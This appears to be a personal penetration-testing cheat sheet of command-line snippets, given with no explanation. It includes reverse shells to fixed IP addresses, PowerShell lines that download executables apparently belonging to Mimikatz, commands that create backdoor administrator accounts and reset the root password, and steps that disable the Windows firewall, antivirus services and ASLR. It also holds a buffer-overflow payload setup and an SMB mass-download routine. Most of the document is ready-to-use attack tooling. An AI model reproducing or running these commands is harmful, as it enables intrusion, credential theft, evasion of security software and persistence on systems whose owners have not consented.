CLI-Fu

Checkout over SSH
ssh://bryan@127.0.0.1:23022/Users/bryan/Projects/ReconScan

XXD Convert Binary
xxd -ps /bin/nc | tr -d "\n" > nc.hex
echo -ne $(cat nc.hex | sed -e 's/\(..\)\?/\\x\1/g') > nc

XXD Without linebreaks
xxd -p -c 5000

Hexdump Convert Binary
hexdump -ve '8/1 "%02x"' /bin/nc | sed "s/ //g" > nc.hex
echo -ne $(cat nc.hex | sed -e 's/\(..\)\?/\\x\1/g') > nc

hexdump -ve '8/1 "%02x"' /bin/nc | sed "s/ //g" | sed 's/\(..\)\?/\\x\1/g' > nc.hex
echo -e $(cat nc.hex) > nc

TFTP
atftpd --daemon /tmp/tftp
tftp -g -l nc.hex -r nc.hex  10.1.9.30 69q
netstat -lnup # to kill the server

httpscreenshot
:%s:\:: ()\tPorts\: :
:%s:^\(.\):Host\: \1:
%s:$:\/open\/tcp\/\/\/\/:

python /root/Tools/masshttp/httpscreenshot.py -i www-services.gnmap -p -t 10 -w 20 -a -vH

smbclient
http://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient

mask ""
recurse ON
prompt OFF
mget *

smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'

Perl
perl -e 'print chr(0x41) x 5000'

GDB-peda
run < <(perl -e 'print chr(0x41) x 42 . "\xa8\x91\x04\x08"')

Enable Core Dump
ulimit -s unlimited

Disable ASLR
sysctl -w kernel.randomize_va_space=0

Allow ptrace processes 
sysctl -w kernel.yama.ptrace_scope=0

Disassemble Binary
objdump -d $program > $program.asm

Print Dynamic Allocation Addresses
objdump -R $program

GDB Examine Memory
(gdb) info registers

GDB Print 32 Bytes Of ESP
(gdb) x/32x $esp

PEDA Set Exploit
pset arg 'cyclic_pattern(128)'
pset arg '"\x41"*28 + int2hexstr(0xbffff418) + "\x90"*24 + shellcode + "\x90"*24'

Metasploit Pattern Generator
/usr/share/metasploit-framework/tools/pattern_create.rb

Start Local SOCKS Proxy
ssh -C -D 1080 stratscan

SFTP Over SOCKS Proxy
sftp -o "ProxyCommand nc -x 127.0.0.1:1080 %h %p" bryan@10.30.10.10

Curl over SOCKS proxy
~/.curlrc: socks5 = "127.0.0.1:1080” # For scripts that wrap curl (like Homebrew)
curl --socks5 127.0.0.1:1080

Reverse Tunnel HTTP Proxy
ssh -R 2112:localhost:22 stratscan
ssh -CD 1080 bryan@127.0.0.1 -p 2112
proxychains mitmproxy 8080

Linux Users
echo "root:noperoot"|/usr/sbin/chpasswd
adduser --uid 31337 --password nope nope 2>&1
pw 
usermod nope -G wheel

adduser nope
usermod nope -G sudo

Windows Users
net user nope nope /add
net localgroup administrators nope /add

Windows Firewall
netsh firewall show opmode
netsh firewall set opmode mode=disable

Windows Tasks
tasklist
tasklist /svc
tasklist /svc | findstr avg
sc queryex avgwd
sc config avgwd start= disabled

WMIC path win32_process get Caption,Processid,Commandline

Reverse Shells
sh -c '(nc 192.168.21.10 4444)'
bash -i >& /dev/tcp/192.168.21.10/4444 0>&1
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Powershell
powershell -command "Get-Service"
powershell -command "Stop-Service tmlisten"
powershell -command "Stop-Service ntrtscan"
powershell -command "Get-Service -name ntrtscan"
powershell -command "Get-Service -name OfcPfwSvc"

powershell -command "Invoke-WebRequest -Uri http://192.168.1.99/m/x64/m.exe -OutFile m.exe"

powershell -command "Invoke-WebRequest -Uri http://192.168.1.99/nope.exe -OutFile nope.exe"

powershell -command "$clnt = new-object System.Net.WebClient; $clnt.DownloadFile(\"http://192.168.1.99/m/x64/m.exe\", \"m.exe\")"

powershell -command "$clnt = new-object System.Net.WebClient; $clnt.DownloadFile(\"http://192.168.1.99/m/x64/mimilib-dll\", \"mimilib.dll\")"

powershell -command "$clnt = new-object System.Net.WebClient; $clnt.DownloadFile(\"http://192.168.1.99/m/x64/m.z\", \"m.z\")"

OfficeScan
taskkill /F /IM TmListen.exe
taskkill /F /IM PccNTMon.exe
taskkill /F /IM OfcPfwSvc.exe
taskkill /F /IM NTRtScan.exe

Windows Download File
iexplore.exe http://blah.com/filename.zip
powershell -command "& { iwr http://www.it1.net/it1_logo2.jpg -OutFile logo.jpg }"
powershell -command "$clnt = new-object System.Net.WebClient; $clnt.DownloadFile(\"https://host/name\", \"outpufilename\")"

http://192.168.1.99/m/x64/m.exe


setuid or setgid (POSIX):
find / -perm -4000 -o -perm -2000
find / -type f -user root -perm -u=s
find / -type f -user $USER -perm -u=w

find / \( -type f -or -type d \) \
  \( \
    \( -user nobody -perm -u=w \) -or \
    \( -group nobody -perm -g=w \) -or \
    -perm -o=w \
  \) \
  -print
